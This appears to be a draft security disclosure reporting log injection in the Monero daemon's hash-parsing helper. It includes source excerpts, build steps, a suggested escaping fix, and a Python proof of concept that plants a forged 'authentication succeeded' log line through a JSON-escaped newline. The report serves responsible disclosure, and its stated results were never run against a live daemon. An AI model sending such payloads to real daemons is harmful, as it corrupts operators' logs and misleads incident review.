# `get_block`/`get_block_header_by_hash` log a raw, unescaped request field on hash-parse failure — reproducible with the daemon's literal default logging configuration (log level 0, unmodified category filters)

## Summary

`parse_hash256()`, the shared helper every JSON-RPC method that takes a block/hash parameter uses to decode a hex-encoded hash string, logs the raw request field verbatim when the string fails to parse as a valid 32-byte hex value:

```cpp
// src/cryptonote_basic/cryptonote_basic_impl.cpp
bool parse_hash256(const std::string &str_hash, crypto::hash& hash)
{
  std::string buf;
  bool res = epee::string_tools::parse_hexstr_to_binbuff(str_hash, buf);
  if (!res || buf.size() != sizeof(crypto::hash))
  {
    MERROR("invalid hash format: " << str_hash);
    return false;
  }
  ...
```

This does not require a malformed request: a perfectly valid, standards-compliant JSON document with a JSON-escaped `\n` in the `hash` field decodes to a string that legitimately contains a real newline byte once parsing succeeds. Since that decoded string isn't valid hex, `MERROR` fires and writes the raw, newline-containing value straight into the daemon's log.

**This is reproducible with the daemon's completely unmodified, out-of-the-box logging configuration** — no `--log-level` flag, no `MONERO_LOGS` environment variable, no custom category filter of any kind. I traced Monero's own category-based log filtering mechanism (`contrib/epee/src/mlog.cpp`, `get_default_categories(0)`) to confirm this precisely, since it determines whether a given `MERROR`/`MWARNING` call is even visible at level 0:

```cpp
// contrib/epee/src/mlog.cpp — the exact category string active at log level 0 (the default)
categories = "*:WARNING,net:FATAL,net.http:FATAL,net.ssl:FATAL,net.p2p:FATAL,net.cn:FATAL,"
             "daemon.rpc:FATAL,global:INFO,verify:FATAL,serialization:FATAL,"
             "daemon.rpc.payment:ERROR,stacktrace:INFO,logging:INFO,msgwriter:INFO";
```

`cryptonote_basic_impl.cpp` sets its log category to `"cn"` (`#define MONERO_DEFAULT_LOG_CATEGORY "cn"`), which is **not** one of the categories restricted to `FATAL` above — it falls through to the wildcard `*:WARNING`, meaning `WARNING`, `ERROR`, and `FATAL` messages in this category are shown by default. `MERROR` is `ERROR`-severity, so this specific call is visible with zero configuration changes. (I verified the underlying category-matching logic in `external/easylogging++.cc`'s `VRegistry::priority_allowed`/`Str::wildCardMatch` is an exact-string match, not a hierarchical/prefix one — so `"cn"` is a genuinely distinct, unrestricted category from `"net.cn"`, which *is* on the FATAL-restricted list.)

## Severity

Monero severity: **MEDIUM**, consistent with this program's own established rating for the "CRLF Injection" weakness class.
Suggested CVSS v3.1: `5.3` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`.

Rationale:
1. Both RPC methods that reach this code (`get_block`, `get_block_header_by_hash`, and their no-underscore aliases) are registered via `MAP_JON_RPC_WE`, which expands to `MAP_JON_RPC_WE_IF(..., true)` — always enabled, no restricted-mode gate. These are basic, always-available blockchain-read methods every wallet and block explorer relies on (`AV:N/PR:N/UI:N`).
2. A single, ordinary, spec-compliant JSON POST triggers it — no malformed JSON, no race, no special daemon configuration (`AC:L`).
3. Reproducible with the daemon's actual shipped default logging configuration — not an elevated `--log-level`, not a custom `MONERO_LOGS` category string. This directly addresses reproducibility-at-default-settings.
4. Impact is confined to log integrity, matching this program's own scoring of the same weakness class in prior reports.

## Affected Versions

Confirmed present, identically, in both:
- **`master`**, commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` (the actively maintained branch):
  - The raw log line: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/cryptonote_basic/cryptonote_basic_impl.cpp#L306-L314
  - Category declaration (`"cn"`, unrestricted at level 0): https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/cryptonote_basic/cryptonote_basic_impl.cpp#L42
  - `on_get_block` call site: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.cpp#L2222
  - `on_get_block_header_by_hash` call site: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.cpp#L2078
  - Unrestricted registration: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.h#L148-L155
  - Level-0 default category string: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/contrib/epee/src/mlog.cpp#L97-L118
- **`v0.18.5.1`**, the latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`:
  - The raw log line, unchanged: https://github.com/monero-project/monero/blob/v0.18.5.1/src/cryptonote_basic/cryptonote_basic_impl.cpp#L322
  - Category declaration, unchanged: https://github.com/monero-project/monero/blob/v0.18.5.1/src/cryptonote_basic/cryptonote_basic_impl.cpp#L45-L46
  - Both call sites, unchanged: https://github.com/monero-project/monero/blob/v0.18.5.1/src/rpc/core_rpc_server.cpp#L2497 and #L2654
  - Level-0 default category string, byte-identical to master.

## Root Cause

`src/cryptonote_basic/cryptonote_basic_impl.cpp`:
```cpp
#define MONERO_DEFAULT_LOG_CATEGORY "cn"
...
bool parse_hash256(const std::string &str_hash, crypto::hash& hash)
{
  std::string buf;
  bool res = epee::string_tools::parse_hexstr_to_binbuff(str_hash, buf);
  if (!res || buf.size() != sizeof(crypto::hash))
  {
    MERROR("invalid hash format: " << str_hash);
    return false;
  }
  ...
}
```

`src/rpc/core_rpc_server.cpp` — reachable, pre-authentication, from two always-enabled JSON-RPC methods:
```cpp
// on_get_block (method "get_block"/"getblock")
bool hash_parsed = parse_hash256(req.hash, block_hash);
```
```cpp
// on_get_block_header_by_hash (method "get_block_header_by_hash"/"getblockheaderbyhash")
bool hash_parsed = parse_hash256(hash, block_hash);   // hash = one entry of req.hashes
```

`src/rpc/core_rpc_server.h`:
```cpp
MAP_JON_RPC_WE("get_block",              on_get_block,                 COMMAND_RPC_GET_BLOCK)
MAP_JON_RPC_WE("getblock",                on_get_block,                 COMMAND_RPC_GET_BLOCK)
MAP_JON_RPC_WE("get_block_header_by_hash", on_get_block_header_by_hash, COMMAND_RPC_GET_BLOCK_HEADER_BY_HASH)
MAP_JON_RPC_WE("getblockheaderbyhash",   on_get_block_header_by_hash,   COMMAND_RPC_GET_BLOCK_HEADER_BY_HASH)
```
```cpp
// contrib/epee/include/net/http_server_handlers_map2.h
#define MAP_JON_RPC_WE(method_name, callback_f, command_type) MAP_JON_RPC_WE_IF(method_name, callback_f, command_type, true)
```
The trailing `true` means these are unconditionally registered — no restricted-mode check.

Why the JSON-parser hardening doesn't stop this (the same reasoning as this program's own already-triaged `send_raw_transaction` report): epee's JSON string scanner correctly decodes a standards-compliant `\n` escape sequence into a literal newline byte before `req.hash`/the per-entry `hash` string is ever populated — that is correct, required JSON semantics, not a parser bug. The literal byte only becomes a problem three steps later, when `parse_hash256` echoes the already-decoded string back into a log line without escaping it.

## Steps to Reproduce

### 1. Run a daemon with its actual, unmodified default configuration

```
git clone --branch v0.18.5.1 --depth 1 https://github.com/monero-project/monero.git
cd monero && git submodule update --init --recursive
mkdir -p build/release && cd build/release
cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../..
make -j"$(nproc)" daemon

./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-getblock/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --non-interactive &
echo "daemon pid: $!"
```

Note there is **no `--log-level` flag anywhere above** — this is the daemon's literal default (level 0, default category filters), exactly as it would run for any operator who never touches logging configuration.

### 2. Send a single, valid JSON-RPC request whose `hash` field contains a JSON-escaped newline

```python
#!/usr/bin/env python3
# poc_get_block_hash_log_injection.py
import json
import sys
import urllib.request

target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:38081/json_rpc"

# A perfectly valid JSON-RPC request. json.dumps() emits \n as the standard
# two-character escape sequence "\\n" in the wire bytes -- there is no raw,
# unescaped control byte in the JSON source text. It is only after successful
# parsing that the decoded "hash" string legitimately contains a real newline.
forged = (
    "deadbeef ATTACKER_MARKER_BEGIN\n"
    "2026-01-01 00:00:00.000\tI FORGED_LOG_LINE: authentication succeeded for admin\n"
    "ATTACKER_MARKER_END"
)
body = json.dumps({
    "jsonrpc": "2.0",
    "id": "0",
    "method": "get_block",
    "params": {"hash": forged},
}).encode()

print(f"POST {target}")
print("raw wire bytes (note the literal backslash-n, not a real newline):")
print(body)

req = urllib.request.Request(target, data=body, method="POST",
                              headers={"Content-Type": "application/json"})
try:
    with urllib.request.urlopen(req, timeout=15) as resp:
        print("HTTP", resp.status, resp.read()[:300])
except Exception as e:
    print("request finished with:", e)
```

```
python3 poc_get_block_hash_log_injection.py http://127.0.0.1:38081/json_rpc
```

As a control, sending the same content with a *literal*, unescaped newline byte in the JSON source (rather than the two-character `\n` escape) should be rejected outright by the daemon's already-hardened JSON parser before ever reaching this code — confirming the two are genuinely different code paths, and that this report exercises the parser-hardening-immune one.

### 3. Check the daemon's log — no flags, no elevated verbosity, just the default log file

```
grep -n "FORGED_LOG_LINE\|ATTACKER_MARKER" /tmp/monero-poc-getblock/chain/regtest/bitmonero.log
```

### Expected result on the vulnerable build

`invalid hash format: deadbeef ATTACKER_MARKER_BEGIN` on its own physical line, followed by a real, blank-timestamp-prefixed `FORGED_LOG_LINE` entry, followed by `ATTACKER_MARKER_END` — three physical lines from one well-formed, default-configuration-visible request.

## Possible Solution

Route `str_hash` through `misc_utils::parse::transform_to_escape_sequence` (the same function this program's own recent JSON-parser fix already uses to safely echo untrusted, already-parsed string content) before interpolating it into the log line:

```cpp
MERROR("invalid hash format: " << epee::misc_utils::parse::transform_to_escape_sequence(str_hash));
```

More generally, `parse_hash256` is a widely-shared helper — this single fix closes the issue for every caller (both RPC methods above, plus any future/internal caller) at once, rather than needing a fix at each call site individually.

## Impact

Forged, multi-line log entries from a single, ordinary, spec-compliant RPC request, reproducible with the daemon's completely default logging configuration — no elevated verbosity, no custom category filter, nothing beyond what a normal, out-of-the-box `monerod` operator would ever see. Reachable pre-authentication via two of the most basic, always-enabled JSON-RPC methods (`get_block`, `get_block_header_by_hash`) that every wallet and block explorer already depends on. Downstream SIEM/log-tooling can be fed fabricated content as if it were real, complicating incident review.

## Note on AI usage

Source-code analysis (tracing Monero's own category-based log-filtering mechanism in `contrib/epee/src/mlog.cpp` and `external/easylogging++.cc` — including confirming the category-matching algorithm is an exact string match rather than a hierarchical one, and computing precisely which categories are and are not restricted to `FATAL` at log level 0 — to find a raw-content log call in a category that survives the daemon's actual default configuration) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` and `master` source. **This has been verified by static code reading only, including full derivation of the exact default log-level-0 category string and its effect on this specific call site — the PoC script has been checked for correctness against the exact code path but has not been run against a live `monerod` process.** Please run it and attach the resulting log lines (from an unmodified, default-configuration daemon, with no `--log-level` flag) before submitting, per this program's requirement for a working PoC with logs.
